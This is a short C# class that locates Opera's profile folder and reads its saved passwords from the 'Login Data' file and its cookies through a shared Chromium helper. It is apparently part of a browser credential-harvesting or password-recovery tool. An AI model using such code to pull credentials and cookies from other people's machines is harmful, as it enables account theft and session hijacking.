﻿using System;
using System.Collections.Generic;
using System.IO;

namespace dao
{
    class Opera : IReader
    {
        public string BrowserName { get { return "Opera"; } }

        private readonly BaseChrome Model;

        public Opera()
        {
            string LOCAL_PATH = BaseChrome.GetAppDataRoamingPath();
            string userDataPath = Path.Combine(LOCAL_PATH, @"Opera Software\Opera Stable");
            Model = new BaseChrome(userDataPath);
        }

        public IEnumerable<PassModel> Passwords(string host = null)
        {
            string path = Path.Combine(Model.UserDataPath, @"Login Data");
            return Model.ReadPasswordProfile("Opera Stable", path, host);
        }

        public IEnumerable<Cookie> Cookies(string host = null)
        {
            return Model.ReadCookie(host);
        }

    }
}
